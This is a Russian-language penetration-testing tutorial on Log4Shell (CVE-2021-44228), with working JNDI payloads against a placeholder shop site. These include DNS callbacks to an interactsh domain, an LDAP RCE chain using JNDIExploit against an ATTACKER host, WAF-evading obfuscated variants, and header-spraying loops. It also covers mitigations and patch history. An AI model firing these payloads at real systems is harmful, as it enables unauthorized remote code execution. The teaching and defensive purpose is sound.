## Вопрос, с которого всё начинается

Приложения пишут **логи**: «пользователь вошёл», «ошибка в запросе», «пришёл такой-то User-Agent». Логи — это просто текст, и кажется, что вставлять туда свой заголовок безопасно.

Но представь библиотеку логирования, которая умеет не просто писать текст, а **подставлять значения**: если в строке встретится `${...}`, она это вычислит. Однажды в такой библиотеке (Log4j 2) подстановка научилась выполнять **JNDI-lookup** — сетевой запрос, который мог загрузить и выполнить чужой код. Так строка в логе превратилась в RCE. Это **Log4Shell** (CVE-2021-44228), и сегодня мы разберём его на одном примере.

## Наш пример

Есть Java-приложение `shop.example`. Начнём с наблюдения: отправим запрос с необычным заголовком и посмотрим, не отражается ли он где-нибудь. Обычно не видно, но логирование идёт «за кадром». Поэтому нам нужен способ **увидеть**, доходит ли наш заголовок до уязвимой библиотеки. Такой способ — попросить сервер обратиться к нам.

Поднимем OOB-канал (out-of-band — «в обход», канал, который мы контролируем) с помощью `interactsh`:

```bash
$ interactsh-client -v
[+] abc123.oast.pro
```

Мы получили уникальный домен `abc123.oast.pro`. Теперь отправим в заголовке `User-Agent` строку, которая заставит уязвимый Log4j сделать DNS-запрос к нам:

```bash
$ curl -s -o /dev/null https://shop.example/ -A '${jndi:dns://ua.abc123.oast.pro/}'
```

Смотрим на listener:

```bash
[ua.abc123.oast.pro] Received DNS interaction from 203.0.113.9 at 2026-10-12 10:14:02
```

Пришёл DNS-запрос от IP цели. Значит, наш `User-Agent` попал в лог, Log4j **раскрыл подстановку** и выполнил lookup. Уязвимость подтверждена — и без единого байта вредоносного кода.

## Шаг 1: что такое JNDI и почему lookup опасен

**JNDI** (Java Naming and Directory Interface) — это API Java для доступа к «каталогам ресурсов»: по имени вроде `ldap://host/name` оно находит и достаёт объект. Log4j 2 до версии 2.15 позволял писать `${jndi:ldap://...}` прямо в логируемой строке, и библиотека выполняла этот lookup.

Опасность в том, что по LDAP можно вернуть не только данные, но и **ссылку на Java-класс**. Старая JVM послушно скачивала этот класс по HTTP и выполняла его — а это уже произвольный код. Схема атаки:

```bash
# 1. HTTP-сервер с вредоносным классом (на нашем хосте)
$ python3 -m http.server 8000
# 2. LDAP-сервер, который отдаёт ссылку на класс
$ java -jar JNDIExploit.jar -i ATTACKER
# 3. payload на цель
$ curl -s https://shop.example/ -A '${jndi:ldap://ATTACKER:1389/Basic/Command/Base64/<base64 id>}'
```

На современных JVM (`trustURLCodebase=false` по умолчанию) удалённая загрузка классов запрещена, и для RCE нужны обходы: классы, уже присутствующие в classpath (gadget chains), LDAP-ответы с сериализованными объектами, `Tomcat`/`Groovy`-цепочки. Инструменты `JNDIExploit`, `marshalsec`, `rogue-jndi` содержат готовые варианты.

## Шаг 2: обфускация payload

WAF ловит «сырую» строку `${jndi:`, поэтому payload обфусцируют. Log4j раскрывает **вложенные** lookup'ы и умеет `lower:`/`upper:`:

```bash
${${lower:j}ndi:${lower:l}dap://ATTACKER/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://ATTACKER/a}
${jndi:${lower:l}${lower:d}a${lower:p}://ATTACKER/a}
```

Проверь, как это раскрывается: `${lower:j}` → `j`, и на выходе снова получается `jndi:ldap://...`, но по пути строка не совпадала с сигнатурой. Для безопасного подтверждения используй схему `dns://` — она не загружает код, а только делает запрос.

## Шаг 3: где искать точку входа

Логируется буквально всё, поэтому проверять надо **все** поля. Чаще всего попадают в лог:

- заголовки: `User-Agent`, `X-Api-Version`, `X-Forwarded-For`, `Referer`, `X-Client-IP`;
- query-параметры: `?q=`, `?search=`;
- тела запросов: JSON, XML, форма;
- cookies, имена файлов при загрузке, поля логина.

Не забывай обфусцировать и проверяй каждое поле:

```bash
$ for h in User-Agent X-Api-Version X-Forwarded-For Referer; do
>   curl -s -o /dev/null https://shop.example/ -H "$h: \${jndi:dns://${h}.abc123.oast.pro/}"
> done
$ curl -s "https://shop.example/?q=\${jndi:dns://q.abc123.oast.pro/}"
```

По имени поддомена (`ua.`, `x-api-version.`, `q.`) ты сразу поймёшь, **какое поле** попало в лог — это и есть точная точка входа.

## Шаг 4: JNDI не только в Log4j

JNDI-инъекция — это класс шире Log4j. Любое приложение, которое передаёт твой ввод в `InitialContext.lookup()`, уязвимо. Признак: параметр, похожий на JNDI-имя. Проверяем:

```bash
$ curl -s 'https://shop.example/lookup?name=ldap://ATTACKER:1389/a'
$ curl -s 'https://shop.example/lookup?name=${jndi:ldap://ATTACKER:1389/a}'
```

Если сервер пытается сходить по этому адресу — это JNDI-инъекция независимо от Log4j. Такие точки встречаются в конфигурациях, RMI/LDAP-клиентах, старых фреймворках, JMS-интеграциях.

## Шаг 5: эволюция патчей — почему «обновились» ≠ «безопасно»

История Log4Shell — гонка патчей и обходов:

- **2.15** закрыл основной вектор `jndi`, но остались рекурсивные lookup'ы в сообщениях.
- **2.16** отключил message lookup'ы, но нашли обход через `ThreadContext`/`MDC`.
- **2.17** закрыл и это; но в 2.17.x были отдельные DoS.

Поэтому проверяй **точную версию**, а не «2.15+». И помни про второй слой защиты — **egress-фильтрацию**: если серверу запрещены исходящие LDAP/RMI/DNS, атака не сработает даже при наличии уязвимости. «Нет callback» не всегда значит «безопасно»: возможно, поле не логируется или egress закрыт.

## Шаг 6: что делать защитнику (и почему это важно и тебе)

Понимание защиты помогает и в атаке: оно объясняет, почему callback иногда не приходит. Защита от Log4j многослойна.

Первый слой — **обновление** до 2.17+, либо удаление класса `JndiLookup` из jar: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`. Второй — **отключение lookup'ов** флагом `-Dlog4j2.formatMsgNoLookups=true`. Третий, и самый надёжный — **egress-фильтрация**: запрет исходящих LDAP/RMI/DNS с серверов приложений. Даже если уязвимость есть, без исходящего соединения JNDI-атака не сработает. Четвёртый — **WAF** на строку `${jndi:`, но обфускация его обходит. Пятый — **инвентаризация**: SBOM, `mvn dependency:tree`, поиск `log4j-core` во всех артефактах.

Для тебя это значит: «callback не пришёл» имеет несколько объяснений. Либо версия исправлена, либо поле не попадает в лог, либо egress закрыт. Различай эти случаи — не записывай «безопасно» там, где уязвимость есть, но не эксплуатируется наружу.

## Что мы теперь знаем

- Log4Shell — RCE через строку, попавшую в лог Log4j 2 (`${jndi:...}`).
- Условие — твой ввод должен попасть в лог; логируется почти всё.
- `dns://` подтверждает уязвимость безопасно, без загрузки кода.
- `ldap://`/`rmi://` дают RCE, но на новых JVM нужны обходы.
- Обфускация обязательна: `${${lower:j}ndi:...}` обходит WAF.
- Уникальные поддомены показывают, какое именно поле уязвимо.
- JNDI-инъекции существуют и вне Log4j — везде, где ввод идёт в `lookup()`.

## На что смотреть дальше

- **Проверяй все точки ввода**, а не только `User-Agent`; логируется и тело, и cookies, и пути.
- **Используй уникальные поддомены** (`ua.`, `q.`, `ref.`) — так найдёшь точное поле.
- **`dns://` для отчёта достаточно** — не запускай боевые payload'ы без необходимости.
- **Egress-фильтрация** может блокировать callback: уязвимость есть, но не эксплуатируется — так и напиши.
- **Проверь JNDI за пределами Log4j** — параметры вроде `ldap://`/`rmi://`.
- **Только с согласия.** Загрузка класса и выполнение кода — реальное вторжение.

## Куда дальше

Дальше мы разберём ещё один способ выполнить свой код на сервере без «инъекции строки» — **десериализацию**: сервер получает сериализованный объект и восстанавливает его, а вместе с ним — и поведение, которое мы заложили. А пока главное запомни: **строка, которая попала в лог, может стать командой**.
